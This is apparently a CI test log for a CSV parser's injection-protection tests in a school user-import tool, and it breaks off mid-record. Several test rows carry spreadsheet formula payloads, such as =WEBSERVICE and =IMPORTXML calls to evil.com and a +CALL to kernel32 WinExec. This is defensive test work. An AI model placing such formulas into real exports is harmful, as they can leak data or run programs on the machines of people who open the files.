2025-11-18T17:35:41.5556537Z   firstName: [32m'=IMPORTXML(http://evil.com/xml; //data)'[39m,
2025-11-18T17:35:41.5557407Z   lastName: [32m'Name'[39m,
2025-11-18T17:35:41.5558034Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5558552Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5558891Z }
2025-11-18T17:35:41.5559041Z 
2025-11-18T17:35:41.5560862Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mComplex Formula Attacks[2m > [22m[2mshould protect against LibreOffice formula injection[22m[39m
2025-11-18T17:35:41.5562354Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5563327Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5564619Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5565322Z }
2025-11-18T17:35:41.5566647Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5567900Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5568472Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5568842Z   cellValues: [
2025-11-18T17:35:41.5569316Z     [32m'libre@attack.com'[39m,
2025-11-18T17:35:41.5569996Z     [32m'=WEBSERVICE(http://evil.com/steal-data)'[39m,
2025-11-18T17:35:41.5570565Z     [32m'User'[39m,
2025-11-18T17:35:41.5570988Z     [32m'docente'[39m
2025-11-18T17:35:41.5571319Z   ],
2025-11-18T17:35:41.5571613Z   columnMapping: {
2025-11-18T17:35:41.5572028Z     email: [33m0[39m,
2025-11-18T17:35:41.5572434Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5572848Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5573257Z     role: [33m3[39m,
2025-11-18T17:35:41.5573636Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5574023Z     password: [33m-1[39m
2025-11-18T17:35:41.5574357Z   }
2025-11-18T17:35:41.5574608Z }
2025-11-18T17:35:41.5574977Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5575528Z   email: [32m'libre@attack.com'[39m,
2025-11-18T17:35:41.5576306Z   firstName: [32m'=WEBSERVICE(http://evil.com/steal-data)'[39m,
2025-11-18T17:35:41.5577294Z   lastName: [32m'User'[39m,
2025-11-18T17:35:41.5577765Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5578289Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5578677Z }
2025-11-18T17:35:41.5579016Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5579507Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5579885Z   cellValues: [
2025-11-18T17:35:41.5580367Z     [32m'libre2@attack.com'[39m,
2025-11-18T17:35:41.5581036Z     [32m'+CALL(kernel32;WinExec;JJ;;calc;0)'[39m,
2025-11-18T17:35:41.5581575Z     [32m'Name'[39m,
2025-11-18T17:35:41.5582189Z     [32m'docente'[39m
2025-11-18T17:35:41.5582514Z   ],
2025-11-18T17:35:41.5582803Z   columnMapping: {
2025-11-18T17:35:41.5583192Z     email: [33m0[39m,
2025-11-18T17:35:41.5583628Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5584110Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5584572Z     role: [33m3[39m,
2025-11-18T17:35:41.5584988Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5585428Z     password: [33m-1[39m
2025-11-18T17:35:41.5585773Z   }
2025-11-18T17:35:41.5586040Z }
2025-11-18T17:35:41.5586420Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5587176Z   email: [32m'libre2@attack.com'[39m,
2025-11-18T17:35:41.5587875Z   firstName: [32m'+CALL(kernel32;WinExec;JJ;;calc;0)'[39m,
2025-11-18T17:35:41.5588483Z   lastName: [32m'Name'[39m,
2025-11-18T17:35:41.5588934Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5589416Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5589783Z }
2025-11-18T17:35:41.5589931Z 
2025-11-18T17:35:41.5591692Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mEmail Field Protection[2m > [22m[2mshould protect email field from formula injection[22m[39m
2025-11-18T17:35:41.5593219Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5594269Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5595875Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5596643Z }
2025-11-18T17:35:41.5598331Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5599348Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5599832Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5600734Z   cellValues: [ [32m'=SUM(A1:A10)@evil.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5601455Z   columnMapping: {
2025-11-18T17:35:41.5601862Z     email: [33m0[39m,
2025-11-18T17:35:41.5602267Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5602729Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5603157Z     role: [33m3[39m,
2025-11-18T17:35:41.5603542Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5603949Z     password: [33m-1[39m
2025-11-18T17:35:41.5604296Z   }
2025-11-18T17:35:41.5604557Z }
2025-11-18T17:35:41.5604947Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5605549Z   email: [32m'=SUM(A1:A10)@evil.com'[39m,
2025-11-18T17:35:41.5606119Z   firstName: [32m'John'[39m,
2025-11-18T17:35:41.5606604Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:41.5607286Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5607855Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5608242Z }
2025-11-18T17:35:41.5608576Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5609043Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5609941Z   cellValues: [ [32m'+cmd@hacker.com'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5610647Z   columnMapping: {
2025-11-18T17:35:41.5611043Z     email: [33m0[39m,
2025-11-18T17:35:41.5611448Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5611872Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5612280Z     role: [33m3[39m,
2025-11-18T17:35:41.5612687Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5613101Z     password: [33m-1[39m
2025-11-18T17:35:41.5613473Z   }
2025-11-18T17:35:41.5613737Z }
2025-11-18T17:35:41.5614123Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5614679Z   email: [32m'+cmd@hacker.com'[39m,
2025-11-18T17:35:41.5615220Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:41.5615788Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:41.5616261Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5617003Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5617399Z }
2025-11-18T17:35:41.5617560Z 
2025-11-18T17:35:41.5619371Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mEmail Field Protection[2m > [22m[2mshould handle legitimate emails with similar patterns[22m[39m
2025-11-18T17:35:41.5621233Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5622265Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5623577Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5624312Z }
2025-11-18T17:35:41.5625694Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5626722Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5627415Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5628343Z   cellValues: [ [32m'user+tag@example.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5629121Z   columnMapping: {
2025-11-18T17:35:41.5629536Z     email: [33m0[39m,
2025-11-18T17:35:41.5629946Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5630368Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5630766Z     role: [33m3[39m,
2025-11-18T17:35:41.5631149Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5631583Z     password: [33m-1[39m
2025-11-18T17:35:41.5631951Z   }
2025-11-18T17:35:41.5632210Z }
2025-11-18T17:35:41.5632579Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5633404Z   email: [32m'user+tag@example.com'[39m,
2025-11-18T17:35:41.5634037Z   firstName: [32m'John'[39m,
2025-11-18T17:35:41.5634516Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:41.5634980Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5635479Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5635872Z }
2025-11-18T17:35:41.5636210Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5636701Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5637926Z   cellValues: [ [32m'user-name@example.com'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5638722Z   columnMapping: {
2025-11-18T17:35:41.5639156Z     email: [33m0[39m,
2025-11-18T17:35:41.5639597Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5640063Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5640528Z     role: [33m3[39m,
2025-11-18T17:35:41.5641074Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5641525Z     password: [33m-1[39m
2025-11-18T17:35:41.5641893Z   }
2025-11-18T17:35:41.5642170Z }
2025-11-18T17:35:41.5642573Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5643181Z   email: [32m'user-name@example.com'[39m,
2025-11-18T17:35:41.5643758Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:41.5644247Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:41.5644728Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5645261Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5645655Z }
2025-11-18T17:35:41.5646009Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5646515Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5647759Z   cellValues: [ [32m'user@sub-domain.example.com'[39m, [32m'Bob'[39m, [32m'Johnson'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5648554Z   columnMapping: {
2025-11-18T17:35:41.5648949Z     email: [33m0[39m,
2025-11-18T17:35:41.5649354Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5649771Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5650174Z     role: [33m3[39m,
2025-11-18T17:35:41.5650558Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5650976Z     password: [33m-1[39m
2025-11-18T17:35:41.5651350Z   }
2025-11-18T17:35:41.5651624Z }
2025-11-18T17:35:41.5652018Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5652658Z   email: [32m'user@sub-domain.example.com'[39m,
2025-11-18T17:35:41.5653218Z   firstName: [32m'Bob'[39m,
2025-11-18T17:35:41.5653717Z   lastName: [32m'Johnson'[39m,
2025-11-18T17:35:41.5654175Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5654659Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5655050Z }
2025-11-18T17:35:41.5655220Z 
2025-11-18T17:35:41.5657141Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mRole Field Protection[2m > [22m[2mshould sanitize role field formulas[22m[39m
2025-11-18T17:35:41.5658844Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5659597Z   originalHeaders: [ [32m'email'[39m, [32m'rol'[39m ],
2025-11-18T17:35:41.5660396Z   normalizedHeaders: [ [32m'email'[39m, [32m'rol'[39m ]
2025-11-18T17:35:41.5660921Z }
2025-11-18T17:35:41.5661316Z [CSV-PARSER] Column indices: {
2025-11-18T17:35:41.5661827Z   email: [33m0[39m,
2025-11-18T17:35:41.5662271Z   firstName: [33m-1[39m,
2025-11-18T17:35:41.5662739Z   lastName: [33m-1[39m,
2025-11-18T17:35:41.5663187Z   role: [33m1[39m,
2025-11-18T17:35:41.5663616Z   rut: [33m-1[39m,
2025-11-18T17:35:41.5664040Z   password: [33m-1[39m
2025-11-18T17:35:41.5664392Z }
2025-11-18T17:35:41.5664714Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5665181Z   totalCells: [33m2[39m,
2025-11-18T17:35:41.5665889Z   cellValues: [ [32m'test1@example.com'[39m, [32m'=SUM(1+1)'[39m ],
2025-11-18T17:35:41.5666505Z   columnMapping: {
2025-11-18T17:35:41.5667153Z     email: [33m0[39m,
2025-11-18T17:35:41.5667608Z     firstName: [33m-1[39m,
2025-11-18T17:35:41.5668102Z     lastName: [33m-1[39m,
2025-11-18T17:35:41.5668540Z     role: [33m1[39m,
2025-11-18T17:35:41.5668924Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5669351Z     password: [33m-1[39m
2025-11-18T17:35:41.5669937Z   }
2025-11-18T17:35:41.5670472Z }
2025-11-18T17:35:41.5670889Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5671523Z   email: [32m'test1@example.com'[39m,
2025-11-18T17:35:41.5672064Z   firstName: [32m''[39m,
2025-11-18T17:35:41.5672511Z   lastName: [32m''[39m,
2025-11-18T17:35:41.5672979Z   role: [32m'=SUM(1+1)'[39m,
2025-11-18T17:35:41.5673477Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5673864Z }
2025-11-18T17:35:41.5674220Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5674728Z   totalCells: [33m2[39m,
2025-11-18T17:35:41.5675459Z   cellValues: [ [32m'test2@example.com'[39m, [32m'@admin'[39m ],
2025-11-18T17:35:41.5676054Z   columnMapping: {
2025-11-18T17:35:41.5676460Z     email: [33m0[39m,
2025-11-18T17:35:41.5677070Z     firstName: [33m-1[39m,
2025-11-18T17:35:41.5677544Z     lastName: [33m-1[39m,
2025-11-18T17:35:41.5677991Z     role: [33m1[39m,
2025-11-18T17:35:41.5678419Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5678850Z     password: [33m-1[39m
2025-11-18T17:35:41.5679235Z   }
2025-11-18T17:35:41.5679522Z }
2025-11-18T17:35:41.5679920Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5680508Z   email: [32m'test2@example.com'[39m,
2025-11-18T17:35:41.5681025Z   firstName: [32m''[39m,
2025-11-18T17:35:41.5681488Z   lastName: [32m''[39m,
2025-11-18T17:35:41.5681960Z   role: [32m'@admin'[39m,
2025-11-18T17:35:41.5682507Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5682896Z }
2025-11-18T17:35:41.5683064Z 
2025-11-18T17:35:41.5684849Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mRole Field Protection[2m > [22m[2mshould accept valid roles even after sanitization[22m[39m
2025-11-18T17:35:41.5686327Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5687563Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5688958Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5689703Z }
2025-11-18T17:35:41.5691129Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5692169Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5692664Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5693549Z   cellValues: [ [32m'test@example.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5694234Z   columnMapping: {
2025-11-18T17:35:41.5694620Z     email: [33m0[39m,
2025-11-18T17:35:41.5695263Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5695710Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5696127Z     role: [33m3[39m,
2025-11-18T17:35:41.5696518Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5697121Z     password: [33m-1[39m
2025-11-18T17:35:41.5697486Z   }
2025-11-18T17:35:41.5697748Z }
2025-11-18T17:35:41.5698127Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5698756Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5699366Z   firstName: [32m'John'[39m,
2025-11-18T17:35:41.5699848Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:41.5700316Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5700849Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5701248Z }
2025-11-18T17:35:41.5701594Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5702093Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5703026Z   cellValues: [ [32m'admin@example.com'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'admin'[39m ],
2025-11-18T17:35:41.5703776Z   columnMapping: {
2025-11-18T17:35:41.5704220Z     email: [33m0[39m,
2025-11-18T17:35:41.5704632Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5705063Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5705466Z     role: [33m3[39m,
2025-11-18T17:35:41.5705839Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5706251Z     password: [33m-1[39m
2025-11-18T17:35:41.5706624Z   }
2025-11-18T17:35:41.5707090Z }
2025-11-18T17:35:41.5707708Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5708347Z   email: [32m'admin@example.com'[39m,
2025-11-18T17:35:41.5708922Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:41.5709443Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:41.5709941Z   role: [32m'admin'[39m,
2025-11-18T17:35:41.5710448Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5710838Z }
2025-11-18T17:35:41.5711000Z 
2025-11-18T17:35:41.5712689Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mRUT Field Protection[2m > [22m[2mshould sanitize RUT field formulas[22m[39m
2025-11-18T17:35:41.5714128Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5714893Z   originalHeaders: [ [32m'email'[39m, [32m'rut'[39m ],
2025-11-18T17:35:41.5715836Z   normalizedHeaders: [ [32m'email'[39m, [32m'rut'[39m ]
2025-11-18T17:35:41.5716357Z }
2025-11-18T17:35:41.5716728Z [CSV-PARSER] Column indices: {
2025-11-18T17:35:41.5717384Z   email: [33m0[39m,
2025-11-18T17:35:41.5717803Z   firstName: [33m-1[39m,
2025-11-18T17:35:41.5718227Z   lastName: [33m-1[39m,
2025-11-18T17:35:41.5718627Z   role: [33m-1[39m,
2025-11-18T17:35:41.5718995Z   rut: [33m1[39m,
2025-11-18T17:35:41.5719386Z   password: [33m-1[39m
2025-11-18T17:35:41.5719728Z }
2025-11-18T17:35:41.5720058Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5720511Z   totalCells: [33m2[39m,
2025-11-18T17:35:41.5721232Z   cellValues: [ [32m'test1@example.com'[39m, [32m'=11111111-1'[39m ],
2025-11-18T17:35:41.5721830Z   columnMapping: {
2025-11-18T17:35:41.5722263Z     email: [33m0[39m,
2025-11-18T17:35:41.5722732Z     firstName: [33m-1[39m,
2025-11-18T17:35:41.5723189Z     lastName: [33m-1[39m,
2025-11-18T17:35:41.5723638Z     role: [33m-1[39m,
2025-11-18T17:35:41.5724064Z     rut: [33m1[39m,
2025-11-18T17:35:41.5724494Z     password: [33m-1[39m
2025-11-18T17:35:41.5724846Z   }
2025-11-18T17:35:41.5725119Z }
2025-11-18T17:35:41.5725495Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5726048Z   email: [32m'test1@example.com'[39m,
2025-11-18T17:35:41.5726519Z   firstName: [32m''[39m,
2025-11-18T17:35:41.5727134Z   lastName: [32m''[39m,
2025-11-18T17:35:41.5727535Z   role: [32m''[39m,
2025-11-18T17:35:41.5727971Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5728328Z }
2025-11-18T17:35:41.5728647Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5729080Z   totalCells: [33m2[39m,
2025-11-18T17:35:41.5729761Z   cellValues: [ [32m'test2@example.com'[39m, [32m'+22222222-2'[39m ],
2025-11-18T17:35:41.5730289Z   columnMapping: {
2025-11-18T17:35:41.5730881Z     email: [33m0[39m,
2025-11-18T17:35:41.5731289Z     firstName: [33m-1[39m,
2025-11-18T17:35:41.5731725Z     lastName: [33m-1[39m,
2025-11-18T17:35:41.5732128Z     role: [33m-1[39m,
2025-11-18T17:35:41.5732510Z     rut: [33m1[39m,
2025-11-18T17:35:41.5732903Z     password: [33m-1[39m
2025-11-18T17:35:41.5733251Z   }
2025-11-18T17:35:41.5733503Z }
2025-11-18T17:35:41.5733874Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5734428Z   email: [32m'test2@example.com'[39m,
2025-11-18T17:35:41.5734920Z   firstName: [32m''[39m,
2025-11-18T17:35:41.5735330Z   lastName: [32m''[39m,
2025-11-18T17:35:41.5735727Z   role: [32m''[39m,
2025-11-18T17:35:41.5736164Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5736552Z }
2025-11-18T17:35:41.5736716Z 
2025-11-18T17:35:41.5738612Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mRUT Field Protection[2m > [22m[2mshould accept valid RUTs[22m[39m
2025-11-18T17:35:41.5739994Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5741149Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m ],
2025-11-18T17:35:41.5742651Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m ]
2025-11-18T17:35:41.5743459Z }
2025-11-18T17:35:41.5745094Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m4[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5746138Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5746632Z   totalCells: [33m5[39m,
2025-11-18T17:35:41.5747887Z   cellValues: [ [32m'test@example.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'docente'[39m, [32m'12.345.678-5'[39m ],
2025-11-18T17:35:41.5748692Z   columnMapping: {
2025-11-18T17:35:41.5749112Z     email: [33m0[39m,
2025-11-18T17:35:41.5749527Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5749960Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5750394Z     role: [33m3[39m,
2025-11-18T17:35:41.5750788Z     rut: [33m4[39m,
2025-11-18T17:35:41.5751179Z     password: [33m-1[39m
2025-11-18T17:35:41.5751528Z   }
2025-11-18T17:35:41.5751800Z }
2025-11-18T17:35:41.5752210Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5752846Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5753437Z   firstName: [32m'John'[39m,
2025-11-18T17:35:41.5753922Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:41.5754377Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5754856Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5755231Z }
2025-11-18T17:35:41.5755558Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5756027Z   totalCells: [33m5[39m,
2025-11-18T17:35:41.5757356Z   cellValues: [ [32m'user@example.com'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'docente'[39m, [32m'11.111.111-1'[39m ],
2025-11-18T17:35:41.5758200Z   columnMapping: {
2025-11-18T17:35:41.5758635Z     email: [33m0[39m,
2025-11-18T17:35:41.5759065Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5759495Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5759897Z     role: [33m3[39m,
2025-11-18T17:35:41.5761112Z     rut: [33m4[39m,
2025-11-18T17:35:41.5761525Z     password: [33m-1[39m
2025-11-18T17:35:41.5761891Z   }
2025-11-18T17:35:41.5762157Z }
2025-11-18T17:35:41.5762549Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5763157Z   email: [32m'user@example.com'[39m,
2025-11-18T17:35:41.5763723Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:41.5764242Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:41.5764715Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5765228Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5765625Z }
2025-11-18T17:35:41.5765780Z 
2025-11-18T17:35:41.5767773Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mNewline Character Protection[2m > [22m[2mshould replace newlines in field values[22m[39m
2025-11-18T17:35:41.5769592Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5770597Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5771929Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5772669Z }
2025-11-18T17:35:41.5774066Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5775092Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5775605Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5776641Z   cellValues: [ [32m'test@example.com'[39m, [32m'First\nLine'[39m, [32m'Last\nLine'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5777639Z   columnMapping: {
2025-11-18T17:35:41.5778144Z     email: [33m0[39m,
2025-11-18T17:35:41.5778577Z     firstName: [33m1[39m,
2025-11-18T17:35:41.5779071Z     lastName: [33m2[39m,
2025-11-18T17:35:41.5779545Z     role: [33m3[39m,
2025-11-18T17:35:41.5779965Z     rut: [33m-1[39m,
2025-11-18T17:35:41.5780414Z     password: [33m-1[39m
2025-11-18T17:35:41.5780792Z   }
2025-11-18T17:35:41.5781080Z }
2025-11-18T17:35:41.5781463Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.5782057Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.5782675Z   firstName: [32m'First\nLine'[39m,
2025-11-18T17:35:41.5783542Z   lastName: [32m'Last\nLine'[39m,
2025-11-18T17:35:41.5806567Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.5807434Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.5807864Z }
2025-11-18T17:35:41.5808043Z 
2025-11-18T17:35:41.5809917Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mNewline Character Protection[2m > [22m[2mshould replace carriage returns in field values[22m[39m
2025-11-18T17:35:41.5811470Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.5812505Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.5813784Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.5814509Z }
2025-11-18T17:35:41.5815976Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.5817224Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.5817748Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.5818785Z   cellValues: [ [32m'test@example.com'[39m, [32m'First\rLine'[39m, [32m'Last\rLine'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.5819599Z   columnMapping: {
2025-11-18T17:35:41.5820060Z     email: [33m0[39m,
2025-11-18T17:35:41.5820507Z     firstName: [33m1[39m,
